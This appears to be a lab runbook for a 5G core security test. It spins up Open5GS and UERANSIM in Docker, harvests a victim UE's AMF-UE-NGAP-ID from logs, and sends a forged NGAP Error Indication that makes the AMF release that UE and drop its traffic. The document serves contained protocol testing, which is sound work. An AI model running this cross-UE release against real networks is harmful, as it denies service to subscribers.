# Open5GS — Error Indication → cross-UE release (T03)

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).

**1. Core + RAN**
```bash
( cd ../5g-lab && ./scripts/core.sh up open5gs && ./scripts/ran.sh up ueransim open5gs )
```
**2. Victim AMF-UE-NGAP-ID**
```bash
V=$(docker logs o5gs-amf 2>&1 | grep 'ngap-handler.c:815' | grep -oE 'AMF_UE_NGAP_ID\[[0-9]+\]' | tail -1 | grep -oE '[0-9]+'); echo $V
```
**3. Capture + fire**
```bash
CFG_CORE=open5gs ./capture_attack.sh open5gs_T03_error_indication_release \
    o5gs-amf o5gs-smf ueransim-open5gs-ueransim-gnb-1 net-5glab 30 \
    -- error-indication --amf-ue-id $V --ran-ue-id 99
```
**Expect:** NGAP **21 + 9** in `amf_ngap_nas_sbi.pcap`; AMF does a local release
(`ngap-handler.c:5165`) → victim UE ping goes to **100% loss** (effect check in README).
**Restore:** `docker restart ueransim-open5gs-ueransim-ue-1`
